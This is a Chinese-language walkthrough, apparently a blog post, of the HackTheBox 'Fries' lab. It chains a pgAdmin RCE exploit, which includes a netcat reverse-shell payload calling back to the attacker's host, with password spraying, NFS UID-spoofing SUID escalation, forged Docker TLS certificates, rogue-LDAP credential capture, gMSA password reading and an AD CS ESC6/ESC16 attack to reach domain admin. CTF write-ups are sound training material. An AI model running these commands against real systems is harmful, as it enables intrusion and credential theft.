---
title: HTB Fires 靶场 Writeup
date: 2026-08-24 20:45:00
categories:
  - 靶场
tags:
  - HTB
  - Fires
  - 靶场
description: HTB Fires 靶场 Writeup
---

靶场已知信息： d.cooper@fries.htb / D4LE11maan!!

##### nmap

```
┌──(echoin㉿kali)-[~]
└─$ nmap -sV -sT 10.129.244.72                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 20:49 CST
Nmap scan report for fries.htb (10.129.244.72)
Host is up (0.17s latency).
Not shown: 984 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.18.0 (Ubuntu)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 19:49:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap
443/tcp  open  ssl/https     nginx/1.18.0 (Ubuntu)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
2179/tcp open  vmrdp?
3268/tcp open  ldap
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.17 seconds

```

80 http

![image-20260427195146170](/img/htb/htb-fires-001.png)

443 https

![image-20260427195306771](/img/htb/htb-fires-002.png)

![image-20260427195442240](/img/htb/htb-fires-003.png)

登录 d.cooper@fries.htb / D4LE11maan!!

但是都登不进去

![image-20260427200319068](/img/htb/htb-fires-004.png)

![image-20260427195752681](/img/htb/htb-fires-005.png)

报错：

无法连接Idap URL，错误:无法绑定ldaps://dc01.fries.htb:636作为CN=svc_infra, CN=Users, DC=fries, DC=htb 原: CommunicationException (dc01.fries.htb: 636;服务器证书{subject=}与PWiM配置信任存储中的证书不匹配。

意思是：`dc01.fries.htb:636` 返回的 LDAPS 服务器证书，和 PWiM/PWM 配置里信任的证书不一致。类似 PWM/SSPR 的 LDAPS 报错就是这个形式：服务端证书不在应用自己的 trust store 里，或者证书换了但应用里还是旧证书

但是namp的时候636端口开了

![image-20260427200746585](/img/htb/htb-fires-006.png)

##### 扫子域名

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.fries.htb" -u http://fries.htb -fs 154
```

![image-20260427205221329](/img/htb/htb-fires-007.png)

code.fries.htb

![image-20260427205416532](/img/htb/htb-fires-008.png)

登录 d.cooper@fries.htb / D4LE11maan!!

![image-20260427205459110](/img/htb/htb-fires-009.png)

![image-20260427205516545](/img/htb/htb-fires-010.png)

是一个docker

![image-20260427205604467](/img/htb/htb-fires-011.png)

![image-20260427205637072](/img/htb/htb-fires-012.png)

这个admin没什么用

有很多修改记录

![image-20260428182241660](/img/htb/htb-fires-013.png)

一个子域名：

```
http://db-mgmt05.fries.htb
```

访问：是一个pgadmin的登录

![image-20260428182450805](/img/htb/htb-fires-014.png)

![image-20260427212735483](/img/htb/htb-fires-015.png)

PostgreSQL数据库的URL和密钥

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

用户名root

密码PsgLR00tpass11

IP：172.18.0.3:5432

数据库名：ps_db

用d.cooper@fries.htb / D4LE11maan!!登录 

![image-20260428182755157](/img/htb/htb-fires-016.png)

但是用得到的密码登录，不行



##### cve

![image-20260427213843723](/img/htb/htb-fires-017.png)

可以使用 Metasploit 的 exploit/multi/http/pgadmin_query_tool_authenticated 模块(不太行)

或独立的 Python 脚本 https://github.com/Cycloctane/cve-2025-2945-poc/blob/main/exp.py。

运行 exploit 脚本，使用简单的文件创建载荷来验证代码执行：

反弹shell

```
python exp.py --target-url http://db-mgmt05.fries.htb --username d.cooper@fries.htb --password 'D4LE11maan!!' --db-name ps_db --db-user root --db-pass 'PsqLR00tpaSS11' --payload "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.99 9001 >/tmp/f')"
```

![image-20260428184248769](/img/htb/htb-fires-018.png)

![image-20260428184309788](/img/htb/htb-fires-019.png)

信息搜集：

```
cb46692a4590:/$ env
env
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CORRUPTED_DB_BACKUP_FILE=
PGAPPNAME=pgAdmin 4 - CONN:881435
HOSTNAME=cb46692a4590
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OAUTHLIB_INSECURE_TRANSPORT=1
PYTHONPATH=/pgadmin4
SHLVL=2
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/etc
```

发现

- password:Friesf00Ds2025!!
- email:admin@fries.htb

对已知用户名和密码进行密码喷撒

```
hydra -L user.txt -P passwords.txt -vV -e ns 10.129.244.72 ssh
```

![image-20260428191429334](/img/htb/htb-fires-020.png)

##### ssh

```
ssh svc@10.129.244.72
```

![image-20260428191559254](/img/htb/htb-fires-021.png)

##### 信息收集

PostgreSQL数据库的ip可ping通

![image-20260428200047791](/img/htb/htb-fires-022.png)

网络配置ip route

![image-20260428202520128](/img/htb/htb-fires-023.png)

不能fscan扫端口，没有admin权限无法创建文件

##### **扫描内部网络常见端口**

```
python3 -c "import socket; services={22:'SSH', 80:'HTTP', 111:'RPC', 443:'HTTPS', 2049:'NFS', 3000:'Node.js', 8443:'HTTPS-Alt'}; [print(f'Port {p} ({services.get(p, \"Unknown\")}) - Open') for p in [22,80,111,443,2049,3000,8443] if socket.socket().connect_ex(('172.18.0.1', p)) == 0]"
```

```
Port 22 (SSH) - Open
Port 80 (HTTP) - Open
Port 111 (RPC) - Open
Port 443 (HTTPS) - Open
Port 2049 (NFS) - Open
Port 3000 (Node.js) - Open
Port 8443 (HTTPS-Alt) - Open
```

##### 2049 NFS！

NFS默认使用的是**111**端口，使用port参数可以改变这个端口值

2049端口漏洞是，NFS（网络文件系统）共享漏洞是指**在NFS 服务的配置或实现过程中存在的安全缺陷，可能导致未经授权的访问、数据泄露、数据篡改或系统被攻击等安全问题**。 这个可以传到网页上拿webshell

查询目标主机 **NFS 挂载信息** :

```
svc@web:/$ showmount -e 172.18.0.1  //查目标开放了哪些 NFS 共享目录
Export list for 172.18.0.1:
/srv/web.fries.htb *
svc@web:/$ showmount --all 172.18.0.1  //查有哪些客户端已经挂载了目标的 NFS 目录。
All mount points on 172.18.0.1:
192.168.100.2:/srv/web.fries.htb
svc@web:/$ showmount --exports 192.168.100.2
Export list for 192.168.100.2:
/srv/web.fries.htb *
```

| 命令                                | 查到的内容                         | 结论                                                 |
| ----------------------------------- | ---------------------------------- | ---------------------------------------------------- |
| `showmount -e 172.18.0.1`           | `/srv/web.fries.htb *`             | `172.18.0.1` 对外共享了 `/srv/web.fries.htb`         |
| `showmount --all 172.18.0.1`        | `192.168.100.2:/srv/web.fries.htb` | 已经有 `192.168.100.2` 这个客户端挂载过这个 NFS 目录 |
| `showmount --exports 192.168.100.2` | `/srv/web.fries.htb *`             | `192.168.100.2` 也在暴露同名 NFS 共享                |

![image-20260428204705024](/img/htb/htb-fires-024.png)

直接搜索这个目录已经存在,但是权限不够，有一个webroot用户

不能直接转到webroot目录，但是可以直接写 Web 根目录

![image-20260428205309020](/img/htb/htb-fires-025.png)

写入了但是访问不了，说明写码不行

/etc/passwd发现数据库用户 barman 

是Backup and Recovery Manager for PostgreSQL （PostgreSQL的备份与恢复管理器）

![image-20260429092555331](/img/htb/htb-fires-026.png)

> ok，理一下：
>
> 现在在外网，在git里信息搜集得到一组数据库信息，利用pgadmin漏洞rce拿到shell,拿到了postgreSQL的管理后台pgadmin用户，在env中找到一个密码，密码喷洒找到一个svc用户，因为ssh端口开放，就直接ssh连接，连接上之后扫端口，发现挂载这NFS共享服务，检测出2个对外共享的ip，发现一个webroot用户可写入根目录，但是访问不了，说明无法写码，当前svc用户的权限也很低，再信息搜集找到一个postgreSQL数据库用户，获得了uid和gid，这个barman是PostgreSQL的备份与恢复管理器，权限挺高，可以从这里入手

现在有NFS内网服务端口，用户的UID和GID，NFS对所有内网IP开放，并且可读写，基于NFS的UID/GID认证机制，我们可以尝试这样的SUID攻击

Chisel 建立反向代理

Kali 端：

```
./chisel server -p 8011 --reverse
```


目标端：

```
./chisel client 10.10.15.99:8011 R:2049:172.18.0.1:2049 R:111:172.18.0.1:111
```

##### SUID提权！

在kali上创建冒充barman的用户A033，用Chisel转发NFS端口以支持kali正常访问该服务，在kali上挂载NFS共享，将svc的bash复制到共享目录下，使用A033的身份复制svc的bash并赋予完全权限，这时以svc运行这个具有SUID位的bash时就会从svc用户转移到barman用户。


在 Kali 上创建匹配用户

```
sudo groupadd -g 59605603 A033
sudo useradd -o -u 117 -g 59605603 -M -s /bin/bash A033
```

挂载 NFS 共享

```
sudo mount -t nfs -o vers=4,port=2049 localhost:/srv/web.fries.htb /mnt/fries
```

创建恶意 SUID Shell

svc:

切换到NFS共享目录

```
cd /srv/web.fries.htb/shared
```

复制bash到共享目录，为后续SUID提权准备

```
cp /bin/bash /srv/web.fries.htb/shared/svc_bash
```

kali:

在NFS共享中复制svc创建的bash文件

```
sudo setpriv --reuid=117 --regid=59605603 --clear-groups /bin/bash -c '
id
cp /mnt/fries/shared/svc_bash /mnt/fries/shared/A033_bash
chmod 6777 /mnt/fries/shared/A033_bash
ls -ln /mnt/fries/shared/A033_bash
'
```

其中：

在NFS共享中复制svc创建的bash文件：

```
cp /mnt/fries/shared/svc_bash /mnt/fries/shared/A033_bash
```

设置SUID+SGID权限，使任何用户执行时都以文件所有者权限运行：

```
chmod 6777 /mnt/fries/shared/A033_bash
```

svc:

执行SUID bash，-p参数保持特权权限，实现提权：

```
./A033_bash -p
```

![image-20260429124207259](/img/htb/htb-fires-027.png)

成功移动到 `barman`

##### Docker TLS 逃逸！

共享目录里的证书文件

```
svc@web:/srv/web.fries.htb/shared$ cd /srv/web.fries.htb/shared
ls -ln A033_bash
./A033_bash -p
id
-rwsrwsrwx 1 117 59605603 1396520 Apr 29 11:40 A033_bash
A033_bash-5.1$ cd certs
A033_bash-5.1$ ls
ca-key.pem  root-cert.pem  server-cert.pem  server-openssl.cnf
ca.pem      root.csr       server.csr
ext.cnf     root-key.pem   server-key.pem
```

> 这个运维配置了理论上的安全机制：
>
> 通信是加密的，很安全！
> 只有有证书的人能连接，很安全！
> 命令还要经过审批，很安全！

但是 barman 属于 infra managers 组，可以读取所有 root 拥有的证书文件，并且 Docker 守护进程现在正以 root 权限运行，barman 可以用 CA 签发伪造证书，绕过 TLS 和插件的认证，提权到 root 掌控整个 WEB 服务器。

生成客户端证书

```
# 生成 RSA 私钥，用于客户端认证
openssl genrsa -out root-key.pem 2048
 
# 创建证书签名请求，设置通用名称为 "root" 以绕过授权检查
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
 
# 创建扩展配置文件，指定证书用于客户端认证
echo "extendedKeyUsage = clientAuth" > ext.cnf
 
# 使用 CA 证书和私钥签发客户端证书，有效期为 10 年
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 3650 -extfile ext.cnf
```

使用伪造的证书连接 Docker API

```
docker --tlsverify -H=127.0.0.1:2376 --tlscacert=ca.pem --tlscert=root-cert.pem --tlskey=root-key.pem run -it --privileged -v /:/host fries-web bash
# 使用伪造的 root 身份证书通过 TLS 认证连接到 Docker 守护进程
# --privileged 赋予容器所有特权
# -v /:/host 将主机根目录挂载到容器内
```

##### 逃逸到主机

```bash
chroot /host
# 切换根目录到主机的文件系统
```

![image-20260429125231000](/img/htb/htb-fires-028.png)

在 `/root/.ssh` 中找到私钥 `id_rsa`，保存到并登录

![image-20260429125731279](/img/htb/htb-fires-029.png)

```
ssh -i root_id_rsa root@fries.htb //kali要提权
```

![image-20260429131030205](/img/htb/htb-fires-030.png)

现在进到内网里了，开始域渗透

##### 域渗透

##### 信息收集

在 /root/scripts/pwm/config/ 中找到 PWM 的配置文件 PwmConfiguration.xml

在配置文件里找到一个密码的hash

```
<property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>
```

将结果保存至 hashl.txt 文件

```
echo '$2y$04$WlTubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG' > pwm_hash.txt
```

破解密码:

```
hashcat -m 3200 -a 0 pwm_hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pwm_hash.txt
```

破解结果：rockon!

![image-20260429152811561](/img/htb/htb-fires-031.png)

这个密码对应pwm的configuration manager 和 editor 

![image-20260429153055846](/img/htb/htb-fires-032.png)

![image-20260429153402896](/img/htb/htb-fires-033.png)

能下载到刚才找到的配置文件，提示了有安全信息

![image-20260429153606819](/img/htb/htb-fires-034.png)

##### ldap信息

域控：DC01.fries.htb

![image-20260429153903943](/img/htb/htb-fires-035.png)

找到一个管理员用户svc_infra,密码未知

![image-20260429153950474](/img/htb/htb-fires-036.png)

##### **PWM 认证劫持**

在 PWM 中添加恶意 LDAP 服务器（kali），然后在msf上监听

![image-20260429155025519](/img/htb/htb-fires-037.png)

![image-20260429155049851](/img/htb/htb-fires-038.png)

监听到ldap的验证密码。是svc_infra的密码 m6tneOMAh5p0wQ0d

![image-20260429155351691](/img/htb/htb-fires-039.png)

##### BloodHound

时间同步

```
sudo ntpdate 10.129.244.72
```

收集 BloodHound 数据

```bash
nxc ldap dc01.fries.htb -d fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' --bloodhound --collection All --dns-server 10.129.244.72
```

启动：

```
cd ~/桌面/tool/BloodHound-linux-x64
chmod +x BloodHound
./BloodHound --no-sandbox
```

分析：

SVC_INFRA

所属组：DOMAIN USERS 

可获得GMSA_CA_PROD$的密码

GMSA_CA_PROD同时属于REMOTE MANAGEMENT USERS组和DOMAIN COMPUTERS组

![image-20260429180148472](/img/htb/htb-fires-040.png)

![image-20260429175326455](/img/htb/htb-fires-041.png)

![image-20260429190517096](/img/htb/htb-fires-042.png)

![image-20260429175429128](/img/htb/htb-fires-043.png)

所以，svc_infra是DOMAIN USERS 组的成员，svc_infra有**ReadGMSAPassword权限利用**权限，可以拿到GMSA_CA_PROD$@FRIES.HTB的密码，*GMSA_CA_PROD同时属于REMOTE MANAGEMENT USERS组，可以登录`WinRM`*，GMSA_CA_PROD$@FRIES.HTB是组服务管理账户，可以管理CA

**AD CS 利用链**：

```
SVC_INFRA 能读 gMSA 密码
拿到 gMSA 的 NTLM / AES
用 gMSA 身份认证
如果这个 gMSA 能控制 CA
优先走 ESC7 或 Golden Certificate
```

##### **ReadGMSAPassword权限利用**！

```
nxc ldap -d fries.htb -u svc_infra -p "m6tneOMAh5p0wQ0d" -k --gmsa dc01.fries.htb
//注意时间同步
```

![image-20260429190113984](/img/htb/htb-fires-044.png)

成功获得gMSA_CA_prod用户 哈希值：f6118585da63c6810f795676f8ddc87d

直接使用evil-winrm登录： 

```
evil-winrm -i dc01.fries.htb -u 'gMSA_CA_prod$' -H "f6118585da63c6810f795676f8ddc87d"
```

![image-20260429190210370](/img/htb/htb-fires-045.png)

现在是gMSA_CA_prod用户

##### AD CS 利用 提权！

上传`Certify`工具查找 **当前用户所属组能利用的证书模板**

```
.\Certify.exe find /vulnerable /currentuser
```

![image-20260429192509304](/img/htb/htb-fires-046.png)

发现当前用户gMSA_CA_prod具有ManageCA权限，这意味着只要将当前用户赋予Certificate Officer权限，就可以任意更改证书颁发机构fries-DC01-CA的设置。

除此之外，当前用户还具有Enroll用户证书的权限，且证书模板User处于激活状态。 

鉴于目前我们已经获得域证书机构的控制权，决定通过开启CA的EDITF_ATTRIBUTESUBJECTALTNAME2参数（该参数开启时允许请求证书时指定任意SAN名称）以及关闭szOID_NTDS_CA_SECURITY_EXT安全插件的方法进行ADCS提权，即组合利用ESC6和ESC16漏洞。

#### AD CS 证书攻击（ESC6 + ESC16）

 首先使用certipy-ad的ca模块，利用ManageCA权限赋予当前用户Certificate Officer权限： 

```
certipy-ad ca -u 'gMSA_CA_prod$'@fries.htb -hashes aad3b435b51404eeaad3b435b51404ee:f6118585da63c6810f795676f8ddc87d -target dc01.fries.htb -dc-ip 10.129.244.72 -ca fries-DC01-CA -add-officer 'gMSA_CA_prod$'
```

![image-20260429192813792](/img/htb/htb-fires-047.png)

成功添加管理权限

随后利用上传的certify工具启用指定证书SAN名称功能，并关闭证书安全插件

```
.\Certify.exe manage-ca --ca FRIES.HTB\fries-DC01-CA --esc6
.\Certify.exe manage-ca --ca FRIES.HTB\fries-DC01-CA --esc16
```

操作完成后手动重启certsvc服务： 

```
Stop-Service certsvc -Force 
Start-Service certsvc 
```

请求管理员证书

```
certipy-ad req -u svc_infra@fries.htb -p "m6tneOMAh5p0wQ0d" -target dc01.fries.htb -dc-ip 10.129.244.72 -ca fries-DC01-CA -template User -upn Administrator@fries.htb -sid "S-1-5-21-858338346-3861030516-3975240472-515" -subject "CN=Administrator,CN=Users,DC=fries,DC=htb" -dcom
```

sid：S-1-5-21-858338346-3861030516-3975240472-515

![image-20260429193328985](/img/htb/htb-fires-048.png)

请求域管理员证书成功

认证获取管理员哈希

```bash
certipy-ad auth -pfx svc_infra.pfx -username administrator -domain fries.htb -dc-ip 10.129.244.72
```

使用管理员 NTLM 哈希登录

```bash
evil-winrm -u administrator -H {A033_REDACTED} -i 10.129.244.72
```

在 `C:\Users\Administrator\Desktop\` 中找到`root.txt`
